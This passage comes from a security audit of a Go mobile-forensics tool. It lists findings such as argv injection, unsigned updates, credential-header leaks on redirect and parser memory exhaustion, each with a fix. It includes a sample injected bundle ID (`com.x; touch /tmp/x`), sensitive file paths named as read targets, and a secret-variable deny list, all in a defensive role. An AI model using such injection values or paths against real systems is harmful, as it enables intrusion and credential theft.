- **Observation:** `go.mod` sets the floor to `1.25.0` with no
  `toolchain` directive. Advisories fixed in later 1.25.x
  patches include CVE-2025-61728 (`archive/zip` DoS -> 1.25.6),
  CVE-2025-61726 (`net/http.ParseForm` DoS -> 1.25.6),
  CVE-2025-61731 (`cmd/go` flag sanitisation -> RCE -> 1.25.6),
  CVE-2025-68119 (toolchain invocation RCE -> 1.25.6),
  CVE-2025-68121 (crypto/tls session ticket -> 1.25.6), plus
  further crypto/tls, crypto/x509, net/http client fixes
  in 1.25.7 / .10 / .12.
- **Reachability:** RCE CVEs hit the BUILD host on `go build`.
  Runtime CVEs in `crypto/tls` and `net/http` client are
  exercised by `internal/secrets/verify.go` and
  `internal/selfupdate/*` outbound calls.
- **Remediation:** Bump to `go 1.25.12`; add
  `toolchain go1.25.12`.

### MFI-DEP-02 -- `golang.org/x/net v0.54.0` dnsmessage panic (CVE-2026-46600)

- **Severity:** High
- **Verdict:** CONFIRMED (advisory), reachable indirectly
- **Package:** `golang.org/x/net v0.54.0`
- **Advisory:** GO-2026-5942 / CVE-2026-46600 --
  `dnsmessage.Parser.SVCBResource` / `HTTPSResource` panic on
  overflowing RRs. Fixed in `v0.56.0`.
- **Reachability:** No direct `x/net/dns/dnsmessage` import.
  `net.Resolver` uses this package under the hood for every
  DNS lookup, including those performed for `http.NewRequest`
  in verify.go and selfupdate. A hostile DNS server can panic
  outbound API calls.
- **Remediation:** `go get golang.org/x/net@v0.57.0` (or later).

---

## Medium

### MFI-UPD-04 -- macOS / Linux `StartUpdate` has no server-side approval

- **Severity:** Medium
- **Verdict:** CONFIRMED
- **File:** `cmd/mfi-gui/gui.go:74-98`; `cmd/mfi-gui/update.go:243-278`;
  `frontend/dist/app.js:2585-2600`
- **Observation:** Only the Windows path calls `approveUpdate()`
  / `consumeApprovalToken()`. On macOS/Linux the binding
  `StartUpdate` calls `g.inProcessUpdate()` immediately. The
  "did the user click OK" check lives purely in JS.
- **Impact:** Any code reaching the Wails runtime (any XSS)
  invokes `StartUpdate` without a Confirm dialog. Absent MFI-UPD-01
  this is a nudge; with MFI-UPD-01 unfixed this is a full RCE
  trigger.
- **Remediation:** Mirror the Windows approval-token model on
  every OS. Generate the token in Go only after a native modal;
  require it in the in-process apply path.

### MFI-UPD-05 -- No downgrade floor

- **Severity:** Medium
- **Verdict:** PLAUSIBLE
- **File:** `internal/selfupdate/selfupdate.go:88-90,271-317`
- **Observation:** `Apply` only checks `info.Available`
  (`Compare(latest,current) > 0`). If GitHub `/releases/latest`
  is manipulated (or briefly compromised), a client can install
  an older, known-vulnerable release. `splitVersion` truncates
  at first `-`/`+`, so `1.0.0-EVIL` compares equal to `1.0.0`.
- **Remediation:** Persist the highest version ever installed
  in the user config dir; refuse anything <=. Reject
  non-numeric suffix comparisons rather than dropping them.

### MFI-UPD-06 -- Updater `http.DefaultClient`: no pinning, follows arbitrary redirects

- **Severity:** Medium
- **Verdict:** CONFIRMED
- **File:** `internal/selfupdate/selfupdate.go:149`,
  `internal/selfupdate/apply.go:184,219`
- **Observation:** Every HTTP is `http.DefaultClient.Do(req)`.
  No custom `Transport`, no `tls.Config{MinVersion: tls.VersionTLS13}`,
  no `RootCAs`, no `CheckRedirect` guard. `AssetURL` /
  `ChecksumsURL` are raw `browser_download_url` strings from
  the API JSON and are followed through 302s
  (GitHub redirects to `objects.githubusercontent.com`) with no
  destination-host validation.
- **Impact:** A trusted-by-OS rogue root CA (state-issued,
  MDM-pushed, "install our root" pentest environment) silently
  intercepts. Defence-in-depth gap for a code-execution
  pipeline.
- **Remediation:** Custom `http.Transport` with
  `TLSClientConfig{MinVersion: tls.VersionTLS12}`. Pin GitHub's
  SPKI set (rotate on release). `CheckRedirect` that rejects
  targets outside a hardcoded host allowlist
  (`api.github.com`, `objects.githubusercontent.com`,
  `github-releases.githubusercontent.com`, `codeload.github.com`).

### MFI-GUI-04 -- Broad `Bind` surface exposes local FS to any JS caller

- **Severity:** Medium
- **Verdict:** CONFIRMED
- **File:** `cmd/mfi-gui/gui.go:461` (`Render`), `:451`
  (`DBTables`), `:456` (`DBRead`), `:358` (`AddKnownSecrets`);
  `renderfile.go:59` (`RemoveDir`), `:89` (`FileStat`),
  `:111` (`OpenExternally`), `:128` (`ListDir`), `:162`
  (`RenderPath`)
- **Observation:** No method restricts `path` to a session-picked
  evidence root. Any JS caller can pass `/etc/shadow`,
  `~/.ssh/id_rsa`, `~/Library/Application Support/*`, etc.
- **Impact:** Amplifies every XSS (MFI-GUI-01/03) to full local
  FS read / delete. `RemoveDir` guards on `/`, `~`, and
  top-level -- passes for `/Applications/Signal.app`.
- **Remediation:** Session-set of operator-picked roots (from
  `PickDirectory` / `PickFile`). Require `filepath.Rel` from a
  root to succeed and `!strings.Contains(rel, "..")` before any
  path binding proceeds.

### MFI-GUI-05 -- `ssh` user + host concatenated into one argv element

- **Severity:** Medium
- **Verdict:** CONFIRMED
- **File:** `cmd/mfi-gui/console.go:68,89`
- **Observation:** `sysproc.Command("ssh", append(args, user+"@"+sshHost)...)`.
  Concatenation packs `user` and `sshHost` into one argv element;
  a leading `-` in `user` reinterprets the element as `-o...`.
  Same CVE class as MFI-CMD-03; separate finding because the
  concat pattern is a distinct code smell.
- **Remediation:** Insert `--` before the user@host arg;
  validate neither field begins with `-`. Prefer `-l <user> <host>`
  form.

### MFI-PAR-05 -- Attacker-controlled inline count sizes `make([]any, N)`

- **Severity:** Medium
- **Verdict:** CONFIRMED
- **File:** `internal/plist/plist.go:136,161,180-181`
- **Observation:** `count` from `sizeAndStart` (up to 8-byte
  inline int) drives `make([]any, count)` (16 bytes/elem) and
  `make([]uint16, count)` (2 bytes/elem). Only downstream
  `d.at(start, count*rs)` bounds it -- and that path has the
  same overflow issue as MFI-PAR-04.
- **Remediation:** Cap `count` per object type
  (`count > 1<<24` -> error) or check
  `count <= uint64(len(data))/max(rs,1)` before allocating.

### MFI-PAR-06 -- `dbview.Read` materialises whole result set in memory

- **Severity:** Medium
- **Verdict:** CONFIRMED
- **File:** `internal/dbview/dbview.go:139-172`
- **Observation:** `Read` scans every row into `[][]string`,
  and `renderCell` converts a `[]byte` cell of any size to a
  `string` when the bytes look textual. No per-cell cap. A
  malicious `Manifest.db` with one giant text-shaped BLOB
  OOMs the process. `findKeychainEntry`
  (`backup_keychain.go:128`) `Scan`s `Files.file` into `[]byte`
  with no cap either.
- **Remediation:** Per-cell cap (`renderCell` at 64 KiB, show
  `<blob N bytes, truncated>`). Aggregate row-total cap. Per-
  column blob-size cap on Manifest.db scans.

### MFI-PAR-07 -- Keybag TLV length `int` cast amplifies memory / panics on 32-bit

- **Severity:** Medium
- **Verdict:** PLAUSIBLE
- **File:** `internal/keystore/keybag.go:55,60,67,86,92`
- **Observation:** `n := int(binary.BigEndian.Uint32(...))`.
  `off+n > len(blob)` bounds `n` to `len(blob)` at worst, so
  each matching TLV `append([]byte(nil), val...)` allocates a
  full copy -- 1:1 amplification per matching tag. On 32-bit
  builds `int(uint32(>=1<<31))` is negative, `off+n < len(blob)`
  passes, and the slice indexing panics with no `recover`.
- **Remediation:** Cap `n` per tag (1 MiB, none legitimately
  exceed a few KB). Mask to uint64 for comparison. Add
  `recover` in the top-level Wails-facing keychain handler.

### MFI-SEC-02 -- Verifier client follows redirects; custom-header credentials leak

- **Severity:** Medium
- **Verdict:** CONFIRMED
- **File:** `internal/secrets/verify.go:66` (client); affected
  `gitlabVerify` (`PRIVATE-TOKEN`), `anthropicVerify`
  (`x-api-key`), `postmanVerify` (`X-Api-Key`)
- **Observation:** Default `Client.CheckRedirect` follows up to
  10 hops. Go's built-in `shouldCopyHeaderOnRedirect` strips
  only `Authorization`, `Www-Authenticate`, `Cookie`,
  `Cookie2` on cross-origin redirects. Custom vendor auth
  headers are copied verbatim.
- **Impact:** Open-redirect in gitlab.com/api/v4, hostile
  egress proxy inserting 302 to attacker.com, or DNS poisoning
  of a vendor host causes verify to POST/GET the exact live PAT
  to the attacker under the correct header.
- **Remediation:** Set
  `CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }`.
  Whoami endpoints do not legitimately redirect. Treat any
  redirect as `VerifyUnknown`.

### MFI-SEC-03 -- `redact()` leaks prefix + length of `known-secret` matches

- **Severity:** Medium
- **Verdict:** CONFIRMED
- **File:** `internal/secrets/secrets.go:154-161` (redact) +
  `:166-189` (`LoadKnownSecrets`)
- **Observation:** `redact` keeps the first 4 characters plus
  exact character count. For Trufflehog rules the 4 chars are
  just the public prefix (`ghp_`, `AKIA`) -- fine. For
  `known-secret` matches the 4 chars are 4 chars of the
  operator's actual literal secret and the length is exact.
  A report `known-secret ... hunt...(18 chars)` narrows the
  guess space for a downstream reader.
- **Remediation:** Distinguish known-secret findings in
  `scanFile`; set `Match = "known-secret:" + hex(sha256(m)[:6])`.
  Or move all rules to a non-reversible hash-tag scheme.

### MFI-SEC-04 -- No per-host rate limit -> operator IP burned by crafted flood

- **Severity:** Medium
- **Verdict:** CONFIRMED
- **File:** `internal/secrets/verify.go:30-31,66,87-104`
- **Observation:** `verifyConcurrency = 8` is the only throttle.
  No per-host token bucket. 500 fake `ghp_...` tokens in a
  scanned app fire 500 GETs at `api.github.com/user`; abuse
  detection blocks the operator's IP for hours of legitimate
  use.
- **Remediation:** Per-host token bucket
  (`golang.org/x/time/rate.Limiter` keyed by URL host, 1 rps,
  burst 3). Hard cap total verifications per host (say 50);
  excess -> `VerifyUnknown`. Stable `User-Agent: MobFI/<version> (verifier)`
  so providers can 429 cleanly.

### MFI-XC-03 -- No signal handler; temp files with sensitive data orphaned

- **Severity:** Medium
- **Verdict:** CONFIRMED
- **File:** `cmd/mfi/main.go:22` (`context.Background()`),
  `cmd/mfi-gui/main.go`
- **Observation:** No `signal.NotifyContext` anywhere. `defer
  os.RemoveAll` in `backup.go:119`, `backup_keychain.go:116`,
  `keystore2.go:39` and the update worker in `/tmp` are all
  skipped on Ctrl-C. `Manifest.db` and `persistent.sqlite`
  copies (carrying wrapped file keys / Android keystore entries)
  persist in `/tmp` across sessions and users.
- **Remediation:** Wrap top-level context with
  `signal.NotifyContext(ctx, os.Interrupt, syscall.SIGTERM)`.
  Give worker goroutines a cleanup window. Add a startup sweep
  of stale `/tmp/mfi-*` and `/tmp/mobfi-*`.

### MFI-XC-04 -- Exported reports carry absolute operator paths

- **Severity:** Medium
- **Verdict:** CONFIRMED
- **File:** `internal/report/report.go:104`,
  `internal/secrets/secrets.go:138` (`Finding.Path`),
  `internal/diff/diff.go:39-40` (`RootA`/`RootB`)
- **Observation:** `Finding.Path` is `filepath.WalkDir`'s
  absolute walk path when the operator passed an absolute
  root. Reports (JSON/HTML/text) include every such path plus
  `RootA/RootB` verbatim.
- **Impact:** A JSON report handed to a client reveals the
  operator's macOS username, parent folder (which often
  carries the client codename), engagement layout, and (if
  two clients scanned in one session) both roots. Operator
  and third-party PII leak.
- **Remediation:** `report.Build` accepts an anonymise-root
  list; record paths relative to it. Or refuse to export
  absolute paths outside the scan root.

### MFI-XC-05 -- Child processes inherit full `os.Environ()`

- **Severity:** Medium
- **Verdict:** CONFIRMED
- **File:** `cmd/mfi-gui/console.go:99`,
  `cmd/mfi-gui/update.go:231`,
  `cmd/mfi/exec_unix.go:14`, `cmd/mfi/exec_windows.go:17`
- **Observation:** Every spawn inherits full parent env; no
  allow-list. Operator's `AWS_*`, `GITHUB_TOKEN`,
  `ANTHROPIC_API_KEY`, `HTTPS_PROXY` etc. reach adb, ssh,
  iproxy, idevicebackup2, aapt. `~/.ssh/config` `LocalCommand`
  or `ProxyCommand` can exfiltrate. Any tool dumping env on
  error surfaces those in captured stderr that ends up in the
  report.
- **Remediation:** Curated child env: `PATH`, `HOME`, `USER`,
  `LANG` / `LC_*`, `TERM` (console only), tool-specific
  (`ADB_VENDOR_KEYS`, `SSH_AUTH_SOCK` if opt-in agent
  forwarding). Strip
  `AWS_*|GITHUB_TOKEN|*_API_KEY|ANTHROPIC_*|HTTPS_PROXY`.

### MFI-XC-06 -- Silent-swallow on transport failure -> false-negative scan

- **Severity:** Medium
- **Verdict:** PLAUSIBLE
- **File:** `internal/transport/adb.go:224-235` (`mustFind`
  ignores errors) + `internal/extract/extract.go:69-73`
  (walk-fn errors demoted to `Skipped`)
- **Observation:** If adb dies partway through Walk, the
  refinement `find -type d` / `-type f` return empty maps and
  the walk visits fewer entries silently. `res.Skipped` may
  not reflect the failure.
- **Impact:** Extraction "succeeds" with 40% of the tree missing.
  Subsequent secret scan reports zero findings -- a
  false-negative for a real secret in the un-scanned half.
- **Remediation:** In `mustFind`, distinguish transport-gone
  from permission-denied; fail closed on broken pipe / device
  offline. Emit an explicit "partial: <N%>" indicator on the
  extract Result so downstream tools do not treat partial as
  clean.

### MFI-CMD-06 -- `adb connect` / `pair` / bundle-id argv accept leading `-`

- **Severity:** Medium
- **Verdict:** PLAUSIBLE
- **File:** `cmd/mfi-gui/connect.go:13-84`;
  `cmd/mfi-gui/appdetails.go:55`;
  `internal/device/simulator.go:182`
- **Observation:** `addr` and `code` passed positionally to
  `adb`. Leading `-` reinterpreted as `-H`, `-P`, `-L`, `-e`,
  `-d`, `-t`, `-s`. Similar for bundle-id argv to `dumpsys` /
  `simctl`.
- **Remediation:** Validate `addr` as `host:port`, `code` as
  digits, bundle-id as `[A-Za-z0-9._-]+`; reject leading `-`
  everywhere. Argv `--` separator where the tool supports it.

### MFI-DEP-03 -- `golang.org/x/text v0.37.0` NFC infinite-loop (CVE-2026-56852)

- **Severity:** Medium
- **Verdict:** CONFIRMED (advisory), low reachability
- **Package:** `golang.org/x/text v0.37.0`
- **Advisory:** GO-2026-5970 -- `norm.Iter` and `norm.Form.*`
  infinite-loop on invalid UTF-8. Fixed `v0.39.0`.
- **Reachability:** No direct `x/text/unicode/norm` use in
  MobFI. Reachable only if chroma / wails / echo pass
  attacker-controlled bytes through `norm`.
- **Remediation:** `go get golang.org/x/text@latest`.

---

## Low

### MFI-UPD-07 -- Update download has no size cap

- **Severity:** Low
- **Verdict:** CONFIRMED
- **File:** `internal/selfupdate/apply.go:196` (`io.Copy(f, resp.Body)`)
- **Observation:** Binary body has no `io.LimitReader`. Checksum
  body correctly uses `1<<20`.
- **Impact:** Compromised or MITM'd release host streams multi-GB.
  Fills the install volume, potentially the OS drive.
- **Remediation:** `io.Copy(f, io.LimitReader(resp.Body, 512<<20))`.
  Sanity-check `Content-Length` up-front.

### MFI-GUI-06 -- Chroma output written via `innerHTML` (defence-in-depth gap)

- **Severity:** Low
- **Verdict:** PLAUSIBLE
- **File:** `frontend/dist/app.js:1565,1841`;
  `cmd/mfi-gui/renderfile.go:355-370` (`highlight`)
- **Observation:** Chroma's HTML formatter escapes token text
  today, but the frontend has no second escape layer. A
  future Chroma bug, custom lexer, or attribute-emitting
  configuration flip becomes XSS.
- **Remediation:** Sandbox iframe (`sandbox=""`) or DOMPurify
  before `innerHTML`. Neutralised by MFI-GUI-01 CSP.

### MFI-GUI-07 -- `OpenExternally` fires shell-handler on extracted file extension

- **Severity:** Low
- **Verdict:** CONFIRMED
- **File:** `cmd/mfi-gui/renderfile.go:111-125`
- **Observation:** Argv is safe (single-arg paths), but the OS
  shell handler is not. A hostile app plants
  `statement.pdf.lnk` or `receipt.pdf.exe` in the extraction
  tree; "Open externally" launches attacker payload.
- **Remediation:** Reject executable extensions or resolve to
  script/executable UTI; require explicit confirm.

### MFI-GUI-08 -- PDF iframe not sandboxed; blob URLs never revoked

- **Severity:** Low
- **Verdict:** PLAUSIBLE
- **File:** `frontend/dist/app.js:1517-1524,1561`
- **Observation:** `<iframe class="render-pdf" src="blob:...">`
  with no `sandbox` attribute. `dataURLToBlobURL` never
  `URL.revokeObjectURL`s. Malicious PDF -> PDFium/PDFKit XSS
  gets same-origin access to `window.parent.go.main.GUI.*`.
- **Remediation:** `sandbox=""`; `URL.revokeObjectURL()` on
  pane replace.

### MFI-PAR-08 -- `reindentXML` depth bound only by 1 MB read cap

- **Severity:** Low
- **Verdict:** PLAUSIBLE
- **File:** `internal/render/render.go:162-183`
- **Observation:** `xml.Decoder.Token` / `Encoder.EncodeToken`
  maintain name-space stacks that grow with element depth.
  Bounded only by `maxRenderBytes = 1 MB`, ~66k nested `<x>`.
  A crafted `.plist` might push a specific Wails build over.
- **Remediation:** Track depth in the reindent loop; reject
  > 128.

### MFI-PAR-09 -- `plist.DecodeAny` on Manifest.db `Files.file` bypasses render cap

- **Severity:** Low
- **Verdict:** CONFIRMED
- **File:** `internal/keystore/backup_keychain.go:142`
  (`fileKeyFromBlob`)
- **Observation:** `blob` is `Manifest.db`'s `file` column
  (an NSKeyedArchiver plist). Legit backups keep it small
  (few KB). Attacker Manifest.db puts a 500 MB blob there;
  `plist.DecodeAny` runs under MFI-PAR-01 / -04 / -05 with no
  size cap.
- **Remediation:** Reject `blob` above ~1 MB before decoding.

### MFI-SEC-05 -- `slackVerify` reads response body unbounded

- **Severity:** Low
- **Verdict:** PLAUSIBLE
- **File:** `internal/secrets/verify.go:207-233`
- **Observation:** `json.NewDecoder(resp.Body).Decode(&body)`
  without `io.LimitReader` and without `Content-Type` check.
  Combined with MFI-SEC-02, a redirect target or a Slack
  error page can stream noise for 8 s.
- **Remediation:** `dec := json.NewDecoder(io.LimitReader(resp.Body, 1<<20))`;
  check `Content-Type` starts with `application/json`.

### MFI-XC-07 -- `saveWindowState` writes without a mutex

- **Severity:** Low
- **Verdict:** CONFIRMED
- **File:** `cmd/mfi-gui/windowstate.go:56-70`
- **Observation:** `os.WriteFile(p, b, 0o644)` with no lock.
  Concurrent resize + shutdown produces truncated JSON.
- **Remediation:** Package-scope mutex, or single-writer
  goroutine on a channel.

### MFI-XC-08 -- Console session ID is `time.Now().UnixNano()`

- **Severity:** Low
- **Verdict:** PLAUSIBLE (collapses without XSS)
- **File:** `cmd/mfi-gui/console.go:117`
- **Observation:** `fmt.Sprintf("con-%d", time.Now().UnixNano())`
  is predictable; XSS could `ConsoleWrite` / `ConsoleClose`
  other tabs.
- **Remediation:** `crypto/rand` -> 16 hex bytes (matches
  `approveUpdate`).

### MFI-PATH-03 -- dbview DSN built via string concat -- fragile on Windows

- **Severity:** Low
- **Verdict:** PLAUSIBLE
- **File:** `internal/backup/backup.go:243`;
  `internal/dbview/dbview.go:48-49`;
  `internal/keystore/backup_keychain.go:123`
- **Observation:** `"file:" + filepath.Join(...) + "?mode=ro&immutable=1"`
  assumes no `?` or `#` in the path. Windows `\` needs
  translation to `/` for the `file:` URI grammar.
- **Remediation:** `net/url.URL{Scheme: "file", Path: filepath.ToSlash(p), RawQuery: "mode=ro&immutable=1"}.String()`.

### MFI-PATH-04 -- Skipped-file record carries raw device bytes

- **Severity:** Low
- **Verdict:** CONFIRMED
- **File:** `internal/extract/extract.go:80,146,168`;
  `internal/backup/backup.go:290,296,307,309,395-408`
- **Observation:** `SkippedFile.Path` and `Reason` and
  `Progress.Path` carry raw device strings that may include
  CR, LF, ANSI escapes, or NUL. Any display path (terminal
  UI, console pane, log file) that prints them raw allows
  terminal injection / log forging.
- **Remediation:** UI/log-layer formatter replacing
  `unicode.IsControl` with `\xNN`. Keep raw name in JSON for
  forensics.

### MFI-CMD-07 -- `afcclient` accepts `-`-leading iOS filenames as flags

- **Severity:** Low
- **Verdict:** PLAUSIBLE
- **File:** `internal/transport/afc.go:101-104,199-226`
- **Observation:** `path` (from device-side `ls` output) passed
  positionally to `afcclient ls/info/get <path>`. Leading `-`
  reinterpretation. No RCE -- argument confusion / wrong
  output.
- **Remediation:** Prepend `./` when path starts with `-`;
  or `--` if afcclient supports it.

---

## Info

### MFI-UPD-08 -- Post-update relaunch target unvalidated

- **Severity:** Info (gated by approval token; contingent on
  MFI-UPD-04)
- **Verdict:** CONFIRMED
- **File:** `cmd/mfi-gui/update.go:89-104,213-241`;
  `update_unix.go:43-73`
- **Observation:** `launchApp(os.Getenv(envRelaunch))` runs an
  arbitrary path -- macOS `open -n <path>`, otherwise
  `exec.Command(target)`. Same-user attacker with a stolen
  approval token can chain: env-set the relaunch target to
  their binary.
- **Remediation:** Validate `envRelaunch` is under the install
  prefix; refuse otherwise.

### MFI-UPD-09 -- Windows `.old` swap silently succeeds when process is still open

- **Severity:** Info
- **Verdict:** PLAUSIBLE
- **File:** `internal/selfupdate/apply.go:160-174`
- **Observation:** `os.Rename(exe, exe+".old")` fails if another
  MobFI process holds the exe open; the 45 s `waitForExit`
  may be insufficient for a hung GUI.
- **Remediation:** Loop-retry with backoff, `MoveFileEx(...,
  MOVEFILE_REPLACE_EXISTING|MOVEFILE_DELAY_UNTIL_REBOOT)`
  fallback, surface outcome unambiguously.

### MFI-CMD-08 -- `dumpsys`-derived `dataDir` reaches shell argv

- **Severity:** Info
- **Verdict:** PLAUSIBLE
- **File:** `cmd/mfi-gui/appdetails.go:257-272`
- **Observation:** `p.DataDir`/`p.CodePath` come from
  `parseDumpsys` via `strings.TrimPrefix`. A compromised
  `dumpsys` on-device (rooted attacker device) can inject
  whitespace / metacharacters into an adb-shell argv.
- **Remediation:** `TrimSpace` and reject metachars.

### MFI-CMD-09 -- Simulator / iOS bundle-id shell-injects on `dumpsys package`

- **Severity:** Info
- **Verdict:** PLAUSIBLE
- **File:** `cmd/mfi-gui/appdetails.go:55` (Android);
  `internal/device/simulator.go:182` (Simulator)
- **Observation:** iOS `CFBundleIdentifier` is loosely enforced
  by dev-signing pipelines. A test app with `com.x; touch /tmp/x`
  would inject on Android `dumpsys` or, on Simulator, produce
  a leading-`-` flag confusion with `simctl`.
- **Remediation:** Whitelist bundle IDs to `[A-Za-z0-9._-]+`.

### MFI-CMD-10 -- `keystore2.adbCatRoot` reuses the MFI-CMD-01 shape

- **Severity:** Info
- **Verdict:** CONFIRMED
- **File:** `internal/keystore/keystore2.go:183-192`
- **Observation:** Same `su -c` wrap as MFI-CMD-01. Paths are
  currently constants (`persistent.sqlite[-wal|-shm]`) so no
  live exploit; flagged because a future edit that admits a
  variable path inherits MFI-CMD-01.

---

## Not findings (verified clean)

Verified during audit, no defect found; recording so a future
auditor does not re-litigate:

- No `InsecureSkipVerify` anywhere in the tree.
- No `math/rand` in production code paths; `approveUpdate`
  uses `crypto/rand`; `keybag_test.go` uses `crypto/rand`
  under a `testing` scope.
- No `unsafe` usage.
- No `syscall.*` misuse (`Statfs`, `Stat_t`, `SysProcAttr` for
  detach, `syscall.Exec` for re-exec, `EscapeArg` for ConPTY
  -- all conventional).
- No MD5 in security contexts. SHA-1 appears only in the iOS
  keybag PBKDF2, which is Apple-spec.
- No hardcoded HTTP URLs; all outbound is HTTPS.
- `Wails` IPC uses the native message-port bridge; bindings
  are not reachable from other origins.
- No dev asset-server exposed at runtime (`wails.json` has no
  `frontendDevServerUrl`, main.go only mounts embedded FS).
- `aeskw.go` uses `subtle.ConstantTimeCompare` for the RFC 3394
  IV integrity check; length checks correct (`>=24`, `%8==0`).
- Tar extract slip guards survive absolute names, `../..`,
  Windows drive letters (`:` percent-encoded on Windows),
  Windows backslashes on Linux, and `./` prefix.
- ADB Walk restricts to `-type f` / `-type d`; symlinks,
  sockets, FIFOs never reach `writeLocal`.
- `os.Symlink` is never called; MobFI never creates a symlink
  on the host.
- Hard-link tar entries (`TypeLink`) hit the `default:` skip
  branch; not reconstructed.
- Manifest.db `flags=4` (symlink) is explicitly skipped in
  `reconstruct`.
- File-mode preservation for tar entries is discarded; no
  setuid/setgid smuggling from a device tarball.
- `dbview.Read` validates the table name against the schema
  before formatting into SQL; `quoteIdent` doubles internal
  quotes -- SQL-identifier injection blocked.
- AFC download uses `os.MkdirTemp` (0700) with a hardcoded
  child name inside; no path-injection surface.
- `regexp2` is an indirect dep with zero source references
  (`grep -rn regexp2 --include='*.go' = 0 hits`); all secret
  patterns compile under Go's RE2 (no ReDoS).
- CLI `runScan` prints redacted match (`f.Match`), never
  raw `f.Secret`.
- `report` package uses `html/template` (safe escaping).
- No `pull_request_target` in `.github/workflows/`; `permissions:
  contents: read` is minimum viable; actions pinned to major
  versions.

---

## Dependency currency (2026-07-31)

| Package | Pinned | Latest | Gap |
|---|---|---|---|
| `go` (toolchain floor) | 1.25.0 | 1.25.12 | 12 patches (MFI-DEP-01) |
| `golang.org/x/net` | v0.54.0 | v0.57.0 | MFI-DEP-02 |
| `golang.org/x/crypto` | v0.51.0 | v0.54.0 | hygiene |
| `golang.org/x/sys` | v0.46.0 | current | -- |
| `golang.org/x/text` | v0.37.0 | v0.39.0+ | MFI-DEP-03 |
| `github.com/wailsapp/wails/v2` | v2.13.0 | v2.13.0 | current on v2 line |
| `github.com/wailsapp/go-webview2` | v1.0.22 | v1.0.22 | current |
| `github.com/labstack/echo/v4` | v4.13.3 | v4.15.4 | not on request path in MobFI |
| `github.com/gorilla/websocket` | v1.5.3 | v1.5.3 | current |
| `github.com/alecthomas/chroma/v2` | v2.27.0 | v2.27.0 | current |
| `github.com/dlclark/regexp2/v2` | v2.2.1 | v2.5.2 | unused in source |
| `modernc.org/sqlite` | v1.54.0 | v1.55.0 | hygiene |
| `modernc.org/libc` | v1.74.1 | v1.74.4 | v1.74.2 / .3 retracted upstream |
| `github.com/UserExistsError/conpty` | v0.1.4 | v0.1.4 | current |
| `github.com/creack/pty` | v1.1.24 | v1.1.24 | current |
| `github.com/pkg/browser` | 2024-01-02 | same | current pre-v1 |
| `github.com/pkg/errors` | v0.9.1 | deprecated | replace on refactor |

---

## Recommended remediation order

1. **MFI-UPD-01** -- sign releases. Blocks the highest-impact
   attack path and is a prerequisite for trusting anything the
   updater does.
2. **MFI-PATH-01** -- add `within()` guard in `reconstruct`
   and a regression test. Small diff, closes an arbitrary
   file write.
3. **MFI-CMD-01** -- swap `su -c '...'` for `su 0 -- <argv>`
   in `adb.go`. Retest ConnectAsRoot flow.
4. **MFI-GUI-01** -- add the CSP `<meta>` to `index.html`.
   Downgrades every XSS-to-RCE pivot to XSS-only.
5. **MFI-SEC-01** -- drop `Secret` from the bound return type;
   route reveal through an explicit `RevealFinding(idx)` that
   requires operator confirmation.
6. **MFI-CMD-02** and **MFI-CMD-03** / **MFI-CMD-04** --
   validate/whitelist device-supplied argv values;
   `--`-terminate positional ssh args.
7. **MFI-PATH-02** -- `O_NOFOLLOW` + `0o600` on `writeLocal`
   and `copyFile`.
8. **MFI-UPD-02** -- `os.CreateTemp` with a randomised suffix,
   `O_EXCL`.
9. **MFI-GUI-02** -- known-hosts file for network SSH.
10. **MFI-GUI-03** -- swap `innerHTML` for DOM construction on
    the update banner.
11. **MFI-PAR-01/-02/-03/-04** -- depth counters + iteration
    caps + `math/bits.Mul64`.
12. **MFI-XC-01** -- refuse dbview WAL fallback or scratch-
    dir copy first.
13. **MFI-XC-02** -- explicit `Transport{Proxy: nil}` in
    verify.
14. **MFI-DEP-01/-02/-03** -- `go 1.25.12`, `x/net@v0.57.0`,
    `x/text@latest`.
15. Everything else per severity in the table.

Fix status tracked in `SECURITY-FIXES.md`; update its status
column as each finding is addressed and reference the commit
hash of the fix.
